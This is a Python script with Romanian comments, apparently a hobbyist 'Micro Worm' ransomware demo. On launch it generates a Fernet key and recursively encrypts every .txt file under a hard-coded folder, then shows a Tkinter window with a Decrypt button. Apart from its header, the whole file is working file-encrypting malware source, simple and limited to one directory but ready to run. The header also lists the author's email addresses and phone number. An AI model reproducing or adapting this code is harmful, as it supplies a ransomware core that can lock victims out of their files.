'''
@Author: Păpăluță Vasile
@E-mail: vasile.papaluta@microlab.utm.md
         papaluta.vasile@isa.utm.md
         vpapaluta@gmail.com
@telephone_number: +373068672240
'''
# Importarea tuturor bibliotecilor necesare
from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import *

# Declararea variabilelor Globale. Modific[ pentru masina ta.
ROOT_DIR = r'C:\Users\Asus VivoBook\PycharmProjects\WORM\ROOT'
KEY = None
KEY_PATH = r'C:\Users\Asus VivoBook\PycharmProjects\WORM\ROOT\key.key'

def create_key():
    ''' Acesată functie generează o cheie de încriptare și o salvează în memoria calculatorului '''
    global KEY, KEY_PATH
    KEY = Fernet.generate_key()
    with open(KEY_PATH, 'wb') as key_file:
        key_file.write(KEY)

def load_key():
    ''' Importarea cheii din fisierul cu cheia de encryptare '''
    global KEY, KEY_PATH
    KEY = open(KEY_PATH, 'rb').read()

def encrypt_file(file_path):
    ''' Aceasta funcție encypteaza un fisier folosind cheia generată '''
    global KEY
    f = Fernet(KEY)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(file_path):
    ''' Aceasta funcție decypteaza un fisier folosind cheia generată '''
    global KEY
    f = Fernet(KEY)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    decrypted_data = f.decrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

def encrypt_folder(dir_path):
    ''' Aceasta functie (recursiva) encrypteaza toate fisierele din folderul cu alea 'dir_path' '''
    global KEY
    file_paths = []
    folders_paths = []
    for path in os.listdir(dir_path):
        if path.endswith('.txt'):
            file_paths.append(os.path.join(dir_path, path))
        elif path.endswith('.key'):
            continue
        else:
            folders_paths.append(os.path.join(dir_path, path))
    for file in file_paths:
        encrypt_file(file)
    if len(folders_paths) != 0:
        for folder in folders_paths:
            encrypt_folder(folder)

def decrypt_folder(dir_path):
    ''' Aceasta functie (recursiva) decrypteaza toate fisierele din folderul cu alea 'dir_path' '''
    global KEY
    file_paths = []
    folders_paths = []
    for path in os.listdir(dir_path):
        if path.endswith('.txt'):
            file_paths.append(os.path.join(dir_path, path))
        elif path.endswith('.key'):
            continue
        else:
            folders_paths.append(os.path.join(dir_path, path))
    for file in file_paths:
        decrypt_file(file)
    if len(folders_paths) != 0:
        for folder in folders_paths:
            decrypt_folder(folder)

def display():
    ''' Aceasta functie arata fereastra de deblocarea dupa encryptarea tuturor fisierelor '''
    window = tk.Tk()
    window.geometry('500x500')
    window.resizable(0, 0)
    text = Label(window, text='Micro Worm created by Micro Lab (Păpăluță Vasile)')
    text.place(relx=0.5, rely=0.5, anchor=CENTER)
    decrypt = Button(window, text='Decrypt', command=lambda : decrypt_folder(ROOT_DIR))
    decrypt.place(rely=0.6, relx=0.5, anchor=CENTER)
    window.mainloop()

# Implimentarea functiilor
if 'key.key' in os.listdir(ROOT_DIR):
    load_key()
else:
    create_key()
    load_key()
encrypt_folder(ROOT_DIR)
display()
